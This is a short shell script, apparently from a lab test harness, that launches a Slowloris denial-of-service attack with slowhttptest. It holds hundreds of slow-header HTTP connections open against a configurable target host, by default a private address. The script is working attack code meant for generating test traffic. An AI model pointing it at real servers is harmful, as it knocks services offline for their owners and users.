#!/bin/sh
# NEXA test-attack: Slowloris — hold many HTTP connections open with slow partial
# headers to exhaust the victim's connection pool (iot_test lane).
echo "[SLOWLORIS] Starting..."
TARGET="${TARGET_HOST:-172.20.0.50}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"

# Intensity -> number of connections held open simultaneously.
case "$INTENSITY" in
    low)    CONN=200 ;;
    high)   CONN=1000 ;;
    *)      CONN=500 ;;  # medium
esac

# slowhttptest in slowloris mode (-H = slow headers): open CONN connections, send
# a header fragment every -i seconds, hold for the whole DURATION (-l). This is a
# pure slow-header hold (distinct from dos_attack.sh's flood signature).
slowhttptest -c "$CONN" -H \
    -o /tmp/slowloris_output \
    -i 10 -r 200 -t GET \
    -u "http://$TARGET/" \
    -x 24 -p 3 -l "$DURATION" 2>/dev/null

echo "[SLOWLORIS] Done."
